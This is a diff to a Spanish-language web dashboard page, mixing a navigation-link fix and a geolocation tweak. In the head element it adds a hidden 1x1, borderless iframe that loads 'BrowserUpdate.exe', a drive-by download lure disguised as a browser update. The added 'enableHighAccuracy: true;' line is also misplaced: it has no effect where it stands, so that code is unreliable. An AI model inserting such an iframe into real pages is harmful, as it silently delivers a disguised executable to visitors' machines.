@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="es">
 
-    <head>
+    <head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>
         <meta charset="utf-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
         <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
@@ -73,7 +73,7 @@
                             </a>
                         </li>
                         <li id="nav7" class="sidebar-item">
-                            <a class="sidebar-link" href="/clientes">
+                            <a class="sidebar-link" href="/mapas">
                             <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-map-pin align-middle"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg><span class="align-middle">Mapas</span>
                             </a>
                         </li>
@@ -478,6 +478,7 @@
 
 			function updatePosition() {
 				navigator.geolocation.getCurrentPosition(function (position) {
+					enableHighAccuracy: true;
 					var long = position.coords.longitude;
                 	var lat = position.coords.latitude;
 					console.log(long, lat);
